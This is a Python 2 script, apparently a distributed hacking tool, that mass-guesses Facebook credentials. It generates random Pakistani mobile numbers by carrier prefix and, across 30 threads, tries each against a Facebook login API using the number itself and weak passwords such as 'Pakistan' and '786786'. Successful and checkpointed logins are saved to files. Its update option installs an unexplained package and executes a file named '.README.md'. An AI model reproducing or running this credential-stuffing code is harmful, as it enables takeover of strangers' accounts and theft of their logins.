#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To BatMan-Error404
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2021
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(50000):
 
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 BatMan.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()
 
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
 
def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### Dev : BatMan-Error404#####
##### LOGO #####
logo='''
\x1b[1;96m░█████╗░██████╗░██████╗░░█████╗
\x1b[1;91m♡╭──────────•◈•──────────╮♡
\x1b[1;97m♡╭──────────•◈•──────────╮♡
\x1b[1;91m➣•◈• Owner  : BatMan-Error404 
\x1b[1;92m➣•◈• Owner  : BlackTiger-Error404
\x1b[1;93m➣•◈• YouTube : Time4 You
\x1b[1;94m➣•◈• Name   : Muhammad Umar
\x1b[1;95m➣•◈•  Whatsapp : +923037335114
\x1b[1;96m➣•◈•  Note     : Any Problem Come Whatsapp
\x1b[1;97m➣•◈•  Note     : No Call Only Message
\x1b[1;91m♡╰──────────•◈•──────────╯♡
\x1b[1;97m♡╰──────────•◈•──────────╯♡"""
                                '''

back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print "\033[1;92mBatMan/BlackTiger Tool Welcome"
	print
        print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
    print  "\033[1;91m╭┳✪✪╤✪✪➛➢" 
	print "\033[1;97m[1]  MOBILINK"
	print  "\033[1;91m╰┻✪✪╧✪✪➛➢"
	print  "\033[1;93m╭┳✪✪╤✪✪➛➢" 
	print "\033[1;96m[2]  TELINOR"
	print  "\033[1;92m╰┻✪✪╧✪✪➛➢"
	print  "\033[1;93m╭┳✪✪╤✪✪➛➢" 
	print "\033[1;95m[3]  WARID"
	print  "\033[1;93m╰┻✪✪╧✪✪➛➢"
	print  "\033[1;94m╭┳✪✪╤✪✪➛➢" 
	print "\033[1;94m[4]  UFONE"
	print  "\033[1;92m╰┻✪✪╧✪✪➛➢"
	print  "\033[1;95m╭┳✪✪╤✪✪➛➢" 
	print "\033[1;93m[5]  ZONG"
	print  "\033[1;95m╰┻✪✪╧✪✪➛➢"
	print  "\033[1;96m╭┳✪✪╤✪✪➛➢" 
	print "\033[1;91m[6]  UpDaTe Tool"
	print "\033[1;91m[0]  ExiT_Back"	 
    print  "\033[1;96m╰┻✪✪╧✪✪➛➢"
	print 50*'-'
	action()
	
def action():	
	bch = raw_input('\n  EnTeR HeRe AnY NuMbEr ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		print "\033[1;91mMoBiLiNk/JAzZ COdE HeRE"
		print  "\033[1;95m╭┳✪✪╤✪✪➛➢" 
		print "\033[1;92m00, 01, 02, 03, 04,"
		print "\033[1;97m05, 06, 07, 08, 09,"
		print  "\033[1;93m╰┻✪✪╧✪✪➛➢"
		try:
			c = raw_input(" SeLeCt CoDE: ")
			k="03"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":			
		os.system("clear")
		print (logo)
		print "\033[1;91mTELINORE CODE HERE"
		print  "\033[1;93m╭┳✪✪╤✪✪➛➢" 
		print "\033[1;94m40, 41, 42, 43, 44,"
		print "\033[1;91m45, 64, ??, ??, ??,"
		print  "\033[1;93m╰┻✪✪╧✪✪➛➢"
		try:
			c = raw_input(" SELECTED CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":			
		os.system("clear")
		print (logo)
		print "\033[1;91mWARID CODE HERE"
		print  "\033[1;91m╭┳✪✪╤✪✪➛➢" 
		print "\033[1;95m20, 21, 22, 23,"
		print "\033[1;93m24, ??, ??, ??,"
		print  "\033[1;93m╰┻✪✪╧✪✪➛➢"
		try:
			c = raw_input(" SELECTED CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="4":			
		os.system("clear")
		print (logo)
		print "\033[1;91mUFONE CODE HERE"
	    print  "\033[1;92m╭┳✪✪╤✪✪➛➢" 
		print "\033[1;97m31, 32, 33, 34,"
		print "\033[1;96m35, 36, 37, ??,"
		print  "\033[1;92m╰┻✪✪╧✪✪➛➢"
		try:
			c = raw_input(" SELECTED CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="5":			
		os.system("clear")
		print (logo)
		print "\033[1;91mZONG CODE HERE"
		print  "\033[1;95m╭┳✪✪╤✪✪➛➢" 
		print "\033[1;93m10, 11, 12, 13,"
		print "\033[1;96m14, 15, 16, 17,"
		print  "\033[1;95m╰┻✪✪╧✪✪➛➢"
		try:
			c = raw_input(" SeLeCT CoDe: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="6":
	    os.system("clear")
	    os.system("pip2 install --upgrade balln")
	    os.system("pip2 install --upgrade balln")
	    os.system("clear")
	    print(logo)
	    print
	    psb (" Tool has been successfully updated")
	    time.sleep(2)
	    os.system("python2 .README.md")
#	elif chb =='3':	
#	    os.system('xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl')
#	    time.sleep(1)
#	    menu()
	elif bch =='0':
		exb()
	else:
		print '[!] Fill in correctly'
		action()
 
	xxx = str(len(id))
	psb ('[⚡] Total Numbers: '+xxx)
	time.sleep(0.5)
	psb ('[💥] Please wait, process is running ...')
	time.sleep(0.5)
	psb ('[🐯] BatMan-Error404/BlackTiger-Error404')
	time.sleep(0.5)
	psb ('[!] Back(To Exit) Press CTRL Then Press z')
	time.sleep(0.5)
	print 50*'-'
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mBatMan(OK)\x1b[1;92m-\x1b[1;92m🎭\x1b[1;92m-' + k + c + user + '-\x1b[1;92m🎭\x1b[1;92m-' + pass1																				
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\x1b[1;96mTiger(CP)\x1b[1;96m-\x1b[1;93m🎭\x1b[1;97m-' + k + c + user + '-\x1b[1;93m🎭\x1b[1;91m-' + pass1
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:	
					pass2 = 'Pakistan'
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print '\x1b[1;92mBatMan(OK)\x1b[1;92m-\x1b[1;92m🎭\x1b[1;92m-' + k + c + user + '-\x1b[1;92m🎭\x1b[1;92m-' + pass2                            											
						okb = open('save/successfull.txt', 'a')
						okb.write(k+c+user+'|'+pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
					else:	
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[1;96mTiger(CP)\x1b[1;96m-\x1b[1;93m🎭\x1b[1;97m-' + k + c + user + '-\x1b[1;93m🎭\x1b[1;91m-' + pass2
							cps = open('save/checkpoint.txt', 'a')
							cps.write(k+c+user+'|'+pass2+'\n')
							cps.close()
							cpb.append(c+user+pass2)
						else:	
							pass3 = '786786'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mBatMan(OK)\x1b[1;92m-\x1b[1;92m🎭\x1b[1;92m-' + k + c + user + '-\x1b[1;92m🎭\x1b[1;92m-' + pass3
								okb = open('save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass3+'\n')
								okb.close()
								oks.append(c+user+pass3)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;96mTiger(CP)\x1b[1;96m-\x1b[1;93m🎭\x1b[1;97m-' + k + c + user + '-\x1b[1;93m🎭\x1b[1;91m-' + pass3
									cps = open('save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass3+'\n')
									cps.close()
									cpb.append(c+user+pass3)
								else:
									pass4 = k + c + user
									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                                q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mBatMan(ok)\x1b[1;92m-\x1b[1;92m🎭\x1b[1;92m-' + k + c + user + '-\x1b[1;92m🎭\x1b[1;92m-' + pass4
										okb = open('save/successfull.txt', 'a')
										okb.write(k+c+user+'|'+pass4+'\n')
										okb.close()
										oks.append(c+user+pass4)
									else:
										if 'www.facebook.com' in q['error_msg']:
											print '\x1b[1;96mTiger(CP)\x1b[1;96m-\x1b[1;93m🎭\x1b[1;97m-' + k + c + user + '-\x1b[1;93m🎭\x1b[1;91m-' + pass4
											cps = open('save/checkpoint.txt', 'a')
											cps.write(k+c+user+'|'+pass4+'\n')
											cps.close()
											cpb.append(c+user+pass4)
								
							
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*'-'
	print '[🎭] Process Has Been Completed (Full Enjoy My Tool) ....'
	print '[🎭] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[🎭] CP File Has Been Saved : save/checkpoint.txt')
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 .README.md')
		
if __name__ == '__main__':
	menu()
